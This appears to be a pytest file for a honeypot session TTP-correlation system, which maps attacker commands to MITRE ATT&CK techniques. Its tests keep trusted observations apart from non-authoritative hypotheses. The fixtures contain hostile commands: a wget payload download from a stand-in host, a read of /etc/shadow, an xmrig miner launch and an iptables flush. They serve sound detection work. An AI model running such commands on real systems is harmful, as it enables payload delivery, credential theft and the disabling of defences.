"""Focused proof of the reviewed TTP/correlation representation contract."""

from __future__ import annotations

import copy
from pathlib import Path

from production.classification.classification_pipeline import (
    MergedResult,
    TTPPrediction,
)
from production.correlation.session_ttp_correlation import (
    apply_session_ttp_correlations,
    build_observed_trusted_ttps,
    correlate_session,
    correlation_allows_influence,
    load_policy,
    validate_policy_document,
)
from production.correlation.semantics import CORRELATION_CONFIDENCE_SEMANTICS
from production.correlation.session_ttp_knowledge import load_correlation_knowledge


ROOT = Path(__file__).resolve().parents[1]
POLICY_PATH = ROOT / "configs" / "session_ttp_correlation.trusted.json"


def _trusted_event(
    event_id: str,
    ttp: str,
    command: str,
    *,
    tactic: str = "discovery",
    confidence: float = 0.91,
    timestamp: str = "2026-08-28T00:00:00Z",
) -> dict:
    return {
        "classification_event_schema": "classification_event.v2",
        "evidence_id": event_id,
        "command": command,
        "original_command": command,
        "ttp": ttp,
        "tactic": tactic,
        "source": "rule",
        "confidence": confidence,
        "high_confidence": True,
        "rule_policy_id": "classification-rules",
        "rule_policy_version": "current",
        "rule_policy_sha256": "a" * 64,
        "rule_policy_load_status": "loaded",
        "authority_decision": {
            "schema_version": "command_authority_decision.v1",
            "decision": "trusted",
            "trusted_eligible": True,
        },
        "event_timestamp": timestamp,
    }


def test_trusted_command_mappings_form_deterministic_observed_session_set() -> None:
    payload = {
        "session_id": "implementation-observed",
        "classification_events": [
            _trusted_event("e-1", "T1033", "id"),
            _trusted_event(
                "e-2",
                "T1033.001",
                "whoami",
                timestamp="2026-08-28T00:00:01Z",
            ),
            {
                **_trusted_event("model-only", "T1105", "wget https://example.invalid/a"),
                "source": "securebert",
            },
        ],
        # Aggregate fields cannot substitute for trusted event provenance.
        "ttps": ["T1059"],
    }

    first = build_observed_trusted_ttps(payload)
    second = build_observed_trusted_ttps(copy.deepcopy(payload))

    assert first == second
    assert [item["technique_id"] for item in first] == ["T1033"]
    observed = first[0]
    assert observed["source_ttp_values"] == ["T1033", "T1033.001"]
    assert observed["classification_event_refs"] == ["e-1", "e-2"]
    assert observed["sequence_indices"] == [0, 1]
    assert observed["authority"]["correlation_may_override"] is False
    assert observed["authority"]["correlation_may_remove"] is False
    assert observed["authority"]["correlation_may_promote"] is False


def test_correlation_hypothesis_is_separate_and_model_only_cannot_promote() -> None:
    session = {
        "session_id": "implementation-context-only",
        "commands": ["wget https://example.invalid/payload"],
        "classification_events": [
            {
                **_trusted_event(
                    "model-event",
                    "T1105",
                    "wget https://example.invalid/payload",
                ),
                "source": "securebert",
            }
        ],
        "raw_events": [],
    }
    result = correlate_session(session, load_policy(POLICY_PATH))

    # The regex/direct rule can provide context, but model-only evidence is
    # never promoted into the trusted observed namespace.
    assert result["observed_trusted_ttps"] == []
    assert result["correlated_ttp_hypotheses"] == result["correlations"]
    hypothesis = next(
        item
        for item in result["correlations"]
        if item["rule_id"] == "downloader-command-observed-correlates-t1105"
    )
    assert hypothesis["output_namespace"] == "correlated_ttp_hypotheses"
    assert hypothesis["correlation_kind"] == "contextual"
    assert hypothesis["authority"]["status"] == "non_authoritative"
    assert hypothesis["authority"]["can_override_trusted"] is False
    assert hypothesis["authority"]["can_remove_trusted"] is False
    assert hypothesis["authority"]["can_promote_trusted"] is False
    assert hypothesis["authority"]["may_drive_prediction"] is False
    assert hypothesis["authority"]["may_authorize_response"] is False
    assert hypothesis["strength_semantics"] == CORRELATION_CONFIDENCE_SEMANTICS
    assert hypothesis["numeric_provenance"] == "PROJECT_LOCAL_HEURISTIC"


def test_applying_correlations_cannot_delete_trusted_observations() -> None:
    session = {
        "session_id": "implementation-preserve-observed",
        "commands": ["id", "wget https://example.invalid/payload"],
        "classification_events": [
            _trusted_event("e-id", "T1033", "id"),
            _trusted_event(
                "e-transfer",
                "T1105",
                "wget https://example.invalid/payload",
                tactic="command-and-control",
                timestamp="2026-08-28T00:00:01Z",
            ),
        ],
        "raw_events": [],
    }
    updated = apply_session_ttp_correlations(session, load_policy(POLICY_PATH))
    observed = updated["observed_trusted_ttps"]
    assert [item["technique_id"] for item in observed] == ["T1033", "T1105"]
    assert updated["correlated_ttp_hypotheses"] is not observed
    assert all(
        item["observation_namespace"] == "observed_trusted_ttps"
        for item in observed
    )


def test_ordered_rule_is_not_labeled_time_bounded() -> None:
    session = {
        "session_id": "implementation-ordered",
        "commands": ["id", "wget https://example.invalid/payload"],
        "classification_events": [
            _trusted_event("e-discovery", "T1033", "id"),
            _trusted_event(
                "e-transfer",
                "T1105",
                "wget https://example.invalid/payload",
                tactic="command-and-control",
                timestamp="2026-08-28T00:00:01Z",
            ),
        ],
        "raw_events": [],
    }
    result = correlate_session(session, load_policy(POLICY_PATH))
    recon = next(
        item
        for item in result["correlations"]
        if item["rule_id"] == "recon-then-payload-chain-correlates-t1105"
    )
    assert recon["rule_type"] == "GENUINE_MULTI_EVENT_CORRELATION"
    assert recon["temporal_semantics"] == "ordered_sequence"
    assert recon["temporal_window_present"] is False
    assert recon["temporal_window"] is None
    assert recon["chronology_quality"] == "timestamp_supported"


def test_insufficient_sequence_evidence_abstains() -> None:
    session = {
        "session_id": "implementation-insufficient",
        "commands": ["id"],
        "classification_events": [_trusted_event("e-discovery", "T1033", "id")],
        "raw_events": [],
    }
    result = correlate_session(session, load_policy(POLICY_PATH))
    assert result["observed_trusted_ttps"][0]["technique_id"] == "T1033"
    assert not any(
        item["rule_id"] == "recon-then-payload-chain-correlates-t1105"
        for item in result["correlations"]
    )


def test_unknown_ttp_marker_fails_closed_even_with_trusted_shape() -> None:
    event = _trusted_event("unknown", "T0000_UNKNOWN", "opaque probe")
    payload = {
        "session_id": "implementation-unknown",
        "classification_events": [event],
        "ttps": ["T1059"],
    }
    assert build_observed_trusted_ttps(payload) == []
    result = correlate_session(payload, load_policy(POLICY_PATH))
    assert result["observed_trusted_ttps"] == []


def test_final_ttps_remains_compatibility_alias_for_command_selection() -> None:
    model = TTPPrediction("T1033", "System Owner/User Discovery", 0.91, True)
    selected = TTPPrediction(
        "T1105",
        "Ingress Tool Transfer",
        0.96,
        True,
        source="rule",
    )
    result = MergedResult("wget", [model], [selected], "rule")
    assert result.selected_command_ttps == [selected]
    assert result.final_ttps == result.selected_command_ttps
    assert result.final_ttps != [model]


def test_current_policy_marks_rule_values_local_and_classifies_rule_shapes() -> None:
    policy = load_policy(POLICY_PATH)
    assert policy["policy"]["numeric_provenance"] == "PROJECT_LOCAL_HEURISTIC"
    assert policy["policy"]["temporal_semantics"] == (
        "session_scoped_no_elapsed_window"
    )
    rules = {item["rule_id"]: item for item in policy["policy"]["rules"]}
    assert rules["download-then-execute-chain-correlates-t1059"]["rule_type"] == (
        "GENUINE_MULTI_EVENT_CORRELATION"
    )
    assert rules["downloader-command-observed-correlates-t1105"]["rule_type"] == (
        "DIRECT_COMMAND_RECONFIRMATION"
    )
    assert all(
        item["numeric_provenance"] == "PROJECT_LOCAL_HEURISTIC"
        for item in policy["policy"]["rules"]
    )


def test_correlation_output_contract_fails_closed_when_authority_is_widened() -> None:
    policy = load_policy(POLICY_PATH)
    policy["policy"]["correlation_output_contract"]["can_promote_trusted"] = True
    errors = validate_policy_document(policy, require_current_semantics=True)
    assert any("can_promote_trusted" in error for error in errors)

    missing_contract = copy.deepcopy(policy)
    missing_contract["policy"].pop("correlation_output_contract")
    errors = validate_policy_document(
        missing_contract,
        require_current_semantics=True,
    )
    assert any("correlation_output_contract is required" in error for error in errors)


def test_monitor_reporting_uses_context_namespace_and_strength_wording() -> None:
    monitor = (ROOT / "production" / "api" / "static" / "monitor.html").read_text(
        encoding="utf-8"
    )
    assert "correlated_ttp_hypotheses" in monitor
    assert "Contextual TTP Correlations" in monitor
    assert "heuristic strength" in monitor
    assert "non-authoritative" in monitor


def test_one_command_can_retain_multiple_authoritative_rule_mappings() -> None:
    command = "cat /etc/passwd /etc/shadow"
    payload = {
        "session_id": "implementation-multi-mapping",
        "commands": [command],
        "classification_events": [
            _trusted_event("e-discovery", "T1033", command),
            _trusted_event(
                "e-credential",
                "T1003.008",
                command,
                tactic="credential-access",
            ),
        ],
    }
    observed = build_observed_trusted_ttps(payload)
    assert [item["technique_id"] for item in observed] == ["T1033", "T1003"]
    assert all(item["trust_tier"] == "trusted_observation" for item in observed)
    assert all(command in item["commands"] for item in observed)


def test_direct_event_reconfirmation_is_contextual_without_trusted_mapping() -> None:
    payload = {
        "session_id": "implementation-direct-event",
        "commands": [],
        "classification_events": [],
        "raw_events": [{
            "eventid": "cowrie.session.file_download",
            "timestamp": "2026-08-29T00:00:00Z",
            "input": "https://example.invalid/payload",
        }],
    }
    result = correlate_session(payload, load_policy(POLICY_PATH))
    assert result["observed_trusted_ttps"] == []
    hypothesis = next(
        item
        for item in result["correlated_ttp_hypotheses"]
        if item["rule_id"] == "cowrie-file-transfer-correlates-t1105"
    )
    assert hypothesis["rule_type"] == "DIRECT_EVENT_RECONFIRMATION"
    assert hypothesis["correlation_kind"] == "contextual"
    assert hypothesis["authority"]["status"] == "non_authoritative"
    assert hypothesis["apply_to_prediction"] is False
    assert correlation_allows_influence(hypothesis, "prediction") is False


def test_multi_event_contextual_id_cannot_become_observed_or_authoritative() -> None:
    payload = {
        "session_id": "implementation-contextual-multi-event",
        "commands": ["xmrig --url stratum+tcp://example.invalid"],
        "classification_events": [],
        "raw_events": [{"eventid": "cowrie.session.file_download"}],
    }
    result = correlate_session(payload, load_policy(POLICY_PATH))
    miner = next(
        item
        for item in result["correlated_ttp_hypotheses"]
        if item["rule_id"] == "botnet-miner-staging-correlates-t1496"
    )
    assert result["observed_trusted_ttps"] == []
    assert miner["ttp"] == "T1496"
    assert miner["rule_type"] == "GENUINE_MULTI_EVENT_CORRELATION"
    assert miner["claim_status"] == "CONTEXTUAL_ONLY"
    assert miner["authority"]["can_promote_trusted"] is False
    assert miner["authority"]["canonical_write_allowed"] is False


def test_ordered_output_explicitly_separates_relationship_from_elapsed_window() -> None:
    payload = {
        "session_id": "implementation-order-semantics",
        "commands": ["id", "wget https://example.invalid/payload"],
        "classification_events": [
            _trusted_event("e-discovery", "T1033", "id"),
            _trusted_event(
                "e-transfer",
                "T1105",
                "wget https://example.invalid/payload",
                tactic="command-and-control",
                timestamp="2026-08-29T00:00:01Z",
            ),
        ],
    }
    result = correlate_session(payload, load_policy(POLICY_PATH))
    recon = next(
        item
        for item in result["correlations"]
        if item["rule_id"] == "recon-then-payload-chain-correlates-t1105"
    )
    assert recon["temporal_claim"] is False
    assert recon["temporal_window_present"] is False
    assert recon["temporal_relationship"] == "ORDERED_SAME_SESSION_RELATIONSHIP"
    assert recon["temporal_semantics"] == "ordered_sequence"


def test_optional_pack_is_unreviewed_and_t1686_is_frozen_ontology_mismatch() -> None:
    pack_path = ROOT / "configs" / "session_ttp_knowledge_pack.generated.json"
    knowledge = load_correlation_knowledge("", [str(pack_path)])
    t1686_rule = next(
        item
        for item in knowledge["policy"]["rules"]
        if item["ttp"] == "T1686"
    )
    assert t1686_rule["optional_pack_status"] == "UNREVIEWED_OPTIONAL_PACK"
    assert t1686_rule["authority_eligibility"] == "CONTEXTUAL_ONLY"
    assert t1686_rule["ontology_binding"]["expected_version"] == "14.1"
    assert t1686_rule["ontology_status"] == "ontology_mismatch"

    result = correlate_session(
        {
            "session_id": "implementation-ontology-mismatch",
            "commands": ["iptables -F"],
            "classification_events": [],
            "raw_events": [],
        },
        knowledge,
    )
    hypothesis = next(
        item
        for item in result["correlated_ttp_hypotheses"]
        if item["ttp"] == "T1686"
    )
    assert hypothesis["claim_status"] == "ONTOLOGY_MISMATCH"
    assert hypothesis["ontology_status"] == "ontology_mismatch"
    assert hypothesis["authority"]["status"] == "non_authoritative"
    assert result["observed_trusted_ttps"] == []

    verified_generated = next(
        item
        for item in knowledge["policy"]["rules"]
        if item["ttp"] == "T1033"
    )
    generated_result = correlate_session(
        {
            "session_id": "implementation-unreviewed-pack",
            "commands": ["show users"],
            "classification_events": [],
            "raw_events": [],
        },
        knowledge,
    )
    generated_hypothesis = next(
        item
        for item in generated_result["correlated_ttp_hypotheses"]
        if item["rule_id"] == verified_generated["rule_id"]
    )
    assert generated_hypothesis["claim_status"] == "UNREVIEWED_RULE"
    assert generated_hypothesis["optional_pack_status"] == "UNREVIEWED_OPTIONAL_PACK"
    assert generated_hypothesis["authority"]["status"] == "non_authoritative"


def test_malformed_or_disagreed_classification_is_audit_only_and_cannot_promote() -> None:
    malformed = {
        "session_id": "implementation-malformed",
        "commands": ["whoami"],
        "classification_events": [
            {
                "classification_event_schema": "classification_event.v2",
                "ttp": "T1033",
                "source": "rule",
                "high_confidence": True,
            },
            {
                **_trusted_event("e-disagreement", "T1033", "whoami"),
                "source": "rule_securebert_disagreement",
                "agreement_status": "technique_and_tactic_disagreement",
                "high_confidence": False,
                "authority_decision": {
                    "decision": "audit_only",
                    "trusted_eligible": False,
                },
            },
        ],
    }
    result = correlate_session(malformed, load_policy(POLICY_PATH))
    assert result["observed_trusted_ttps"] == []
    assert all(
        item["authority"]["can_promote_trusted"] is False
        for item in result["correlated_ttp_hypotheses"]
    )
